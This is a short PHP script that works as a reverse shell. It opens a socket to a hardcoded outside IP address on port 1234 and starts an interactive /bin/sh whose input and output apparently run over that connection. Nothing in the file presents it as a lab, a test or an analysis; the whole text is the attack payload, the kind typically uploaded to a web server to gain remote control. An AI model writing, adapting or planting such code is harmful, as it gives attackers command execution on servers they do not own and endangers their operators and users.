<?php

$ip = '113.160.235.101';
$port = 1234;

$sock = fsockopen($ip, $port);
if ($sock) {
    shell_exec("/bin/sh -i <&3 >&3 2>&3");
}

?>
